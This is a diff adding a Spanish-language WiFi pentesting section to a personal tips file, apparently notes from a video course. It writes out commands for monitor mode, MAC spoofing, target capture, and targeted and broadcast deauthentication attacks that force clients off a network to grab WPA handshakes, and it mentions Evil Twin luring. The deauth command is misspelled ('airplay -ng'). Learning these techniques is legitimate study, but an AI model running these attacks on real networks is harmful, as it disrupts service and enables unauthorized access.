@@ -22,6 +22,8 @@
 
 [#TMUX](#TMUX)
 
+[#WIFI](#WIFI)
+
 ------------
 
 ### SSH
@@ -173,3 +175,32 @@
   - Dividir verticalmente: **CTRL+B , %**
   - Dividir horizontalmente: **CTRL+B, "**
   - cambiar de panel **CTRL+B , 'flechas'**
+
+
+### WIFI
+  - basado: **https://lbry.tv/@s4vitar:f/pentesting_redes_wifi**
+  - requisito: tarjeta permita modo monitor (captura todos los paquetes que viajen por el aire)
+
+  PREPARAR HW:
+  - listar tarjetas **ifconfig** (saldra algo como wlan0)
+  - activar modo monitor: **airmon-ng start wlan0**, luego hacemos **ifconfig** ahora la interfaz se llamar algo como wlan0mon (00:04)
+  - matar wpa_supplicant y dhclient: **killall dhclient wpa_supplicant**
+  - cambiar mac: **ifconfig wlan0 down** (no podemos cambiarla si esta activa) y luego **macchanger -a wlan0mon** (-a nos da una aleatoria). Podriamos poner la MAC que quisieramos con **macchanger --mac="poner_aqui_la_MAC" wlan0mon**. Con **macchanger -s wlan0mon** puedo ver la real y la nueva.
+  - en .bashrc podemos hacer un script para 'preparar el entorno'. Enviamos la salida de outputs a /dev/null (00:16)
+  - <img src="https://github.com/sergioalegre/OS_Tips/blob/master/pics/wifi1.jpg">
+  - si nos da problemas el modo monitor, podemos resetear la red con **service network-manager restart**
+
+  NUESTRO ENTORNO:
+  - listar ESSIDs accesibles **iwlist wlan0 scan | grep ESSID -i**
+  - invocamos la funcion con **monitorInit** (00:21)
+  - Veremos nuestro entorno con **airodump-ng wlan0mon** nos enseñara las redes y los clientes conectados a ellas. El BBSI es la MAC del router, PWR es lo cercana que esta la red, cuando mas cercana a 0 señal mas fuerte (00:24) STATION es la MAC de un cliente conectado a alguna red (00:28), sabemos si el cliente esta activo (00:30) si aumenta el numero de Frames. Probe (00:33) te mostrara a clientes que estan buscando redes conocidas (a las que ya han estado conectados en el pasasdo) es util porque si sabemos que ese cliente busca esa red la podemos generar para engañarle (00:36-00:41) creo que esto se llama Evil Twin Attack.
+
+  RED OBJETIVO:
+  - para centrarnos en la red objetivo **airodump-ng --essid <nombre_ssid> wlan0mon** (00:42)
+  - capturamos trafico **airodump-ng -w archivo_captura --essid <nombre_ssid> wlan0mon** (00:44) la idea es luego con tshark o wireshark cargar el archivo generado **tshark -r archivo_captura.cap**
+
+  - Ataque de-autenticacion dirigido (capturar handshake expulsando a un cliente de la red) Funciona solo para WPA/WPA2 con PSK (00:47-00:53)
+    - **airplay -ng -0 10 -e <nombre_essid> -c <mac_cliente> wlan0mon** (00:51)
+
+  - Ataque de-autenticacion global (expulsar a todos los clientes de la red, mas probable de obtener el handshake)(00:53)
+    - **airplay -ng -0 10 -e <nombre_essid> -c FF:FF:FF:FF:FF:FF wlan0mon**
